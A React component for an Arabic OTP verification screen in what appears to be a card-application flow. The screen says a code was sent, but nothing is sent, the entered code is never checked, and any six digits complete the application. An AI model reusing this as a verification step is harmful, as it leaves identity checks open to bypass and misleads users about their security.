import { useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { base44 } from "@/api/base44Client";
import StepProgress from "@/components/StepProgress";
import { Lock } from "lucide-react";

export default function OtpVerify() {
  const navigate = useNavigate();
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const inputs = useRef([]);

  const handleChange = (i, val) => {
    if (!/^\d*$/.test(val)) return;
    const next = [...otp];
    next[i] = val.slice(-1);
    setOtp(next);
    if (val && i < 5) inputs.current[i + 1]?.focus();
  };

  const handleKeyDown = (i, e) => {
    if (e.key === "Backspace" && !otp[i] && i > 0) inputs.current[i - 1]?.focus();
  };

  const handleVerify = async () => {
    const code = otp.join("");
    if (code.length < 6) { setError("أدخل الرمز كاملاً"); return; }
    setLoading(true);
    setError("");
    // Mark application as completed
    const appId = localStorage.getItem("card_app_id");
    if (appId) {
      await base44.entities.CardApplication.update(appId, {
        current_step: "completed",
        status: "completed",
      });
      localStorage.removeItem("card_app_id");
    }
    setLoading(false);
    navigate("/success");
  };

  const handleResend = () => {
    setOtp(["", "", "", "", "", ""]);
    setError("");
    inputs.current[0]?.focus();
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col" dir="rtl">
      <StepProgress currentStep="otp" />

      <div className="flex-1 flex flex-col items-center justify-center px-6 py-10">
        <div className="w-16 h-16 bg-yellow-50 rounded-2xl flex items-center justify-center mb-5 shadow-sm">
          <Lock className="w-8 h-8 text-yellow-500" />
        </div>

        <h2 className="text-xl font-bold text-foreground mb-2">التحقق من الهوية</h2>
        <p className="text-sm text-gray-500 text-center mb-8 leading-relaxed">
          تم إرسال رمز التحقق إلى رقم هاتفك المسجل.<br />أدخل الرمز للمتابعة.
        </p>

        {/* OTP Inputs */}
        <div className="flex gap-2 mb-6 flex-row-reverse">
          {otp.map((digit, i) => (
            <input
              key={i}
              ref={(el) => (inputs.current[i] = el)}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
              className={`w-12 h-14 text-center text-xl font-bold border-2 rounded-xl bg-white focus:outline-none transition-colors
                ${digit ? "border-yellow-400 text-foreground" : "border-gray-200 text-gray-400"}
                ${error ? "border-red-300" : ""}`}
            />
          ))}
        </div>

        {error && <p className="text-red-500 text-sm mb-4">{error}</p>}

        <button
          onClick={handleVerify}
          disabled={loading}
          className="w-full max-w-sm py-4 text-base font-bold rounded-2xl text-white transition-all duration-300 hover:scale-[1.02] hover:shadow-lg active:scale-[0.98] disabled:opacity-70"
          style={{ background: 'linear-gradient(135deg, #c9a227 0%, #e6c84a 50%, #c9a227 100%)' }}
        >
          {loading ? "جارٍ التحقق..." : "تأكيد"}
        </button>

        <button onClick={handleResend} className="mt-4 text-sm text-primary hover:underline">
          إعادة إرسال الرمز
        </button>
      </div>
    </div>
  );
}